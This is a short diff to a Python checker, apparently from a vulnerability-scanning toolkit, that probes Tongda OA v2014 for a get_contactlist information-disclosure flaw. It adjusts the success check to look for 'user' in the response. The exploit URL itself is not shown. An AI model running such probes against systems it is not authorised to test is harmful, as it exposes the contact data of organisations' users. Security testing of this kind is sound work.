@@ -22,7 +22,7 @@ def main(target_url):
     try:
         requests.packages.urllib3.disable_warnings()
         response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
-        if response.status_code== 200:
+        if response.status_code== 200 and 'user' in response.text:
             console.print(now_time() + ' [SUCCESS]  存在通达OA v2014 get_contactlist敏感信息泄漏漏洞:{}'.format(exp_url), style='bold green')
         else:
             console.print(now_time() + " [WARNING]  不存在通达OA v2014 get_contactlist敏感信息泄漏漏洞", style='bold red')
